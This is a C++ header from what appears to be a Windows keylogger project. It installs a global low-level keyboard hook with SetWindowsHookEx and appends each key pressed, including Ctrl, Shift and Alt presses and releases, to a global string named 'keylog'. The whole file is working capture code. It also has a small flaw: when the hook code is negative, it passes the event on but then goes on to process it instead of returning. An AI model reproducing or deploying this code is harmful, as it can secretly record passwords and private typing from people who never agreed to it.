#ifndef KEYBOARD_H
#define KEYBOARD_H

#include <iostream>
#include <fstream>
#include <ostream>
#include "windows.h"
#include "KeyPair.h"
#include "FileOperations.h"
#include "Timestamp.h"

std::string keylog = "";
HHOOK kbHook = NULL;

        LRESULT __stdcall OurkeyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
        {
            if(nCode < 0)
            {
                CallNextHookEx(kbHook, nCode, wparam, lparam);
            }
            KBDLLHOOKSTRUCT *kbs = (KBDLLHOOKSTRUCT *) lparam;
            if(wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
            {
                keylog += kp::keys::KEYS[kbs->vkCode].keyName;
                if(kbs->vkCode == VK_RETURN)
                {
                    keylog += "\n";
                }
            }
            else if(wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
            {
                DWORD key = kbs->vkCode;
                if(key == VK_CONTROL  ||
                   key == VK_LCONTROL ||
                   key == VK_RCONTROL ||
                   key == VK_SHIFT    ||
                   key == VK_LSHIFT   ||
                   key == VK_RSHIFT   ||
                   key == VK_MENU     ||
                   key == VK_LMENU    ||
                   key == VK_RMENU    ||
                   key == VK_CAPITAL  ||
                   key == VK_NUMLOCK  ||
                   key == VK_LWIN     ||
                   key == VK_RWIN
                )
                {
                    std::string KeyName = kp::keys::KEYS[kbs->vkCode].keyName;
                    KeyName.insert(1, "/");
                    keylog += KeyName;
                }
            }
            return CallNextHookEx(kbHook, nCode, wparam, lparam);
        }

        bool installHook(void)
        {
            fileOperations::fileOps().WriteAppLog("Installing keyboard hook");
            kbHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurkeyboardProc, GetModuleHandle(NULL), 0);
            return (kbHook != NULL);
        }

        bool uninstallHook(void)
        {
            bool b = UnhookWindowsHookEx(kbHook);
            kbHook = NULL;
            return b;
        }

#endif //KEYBOARD_H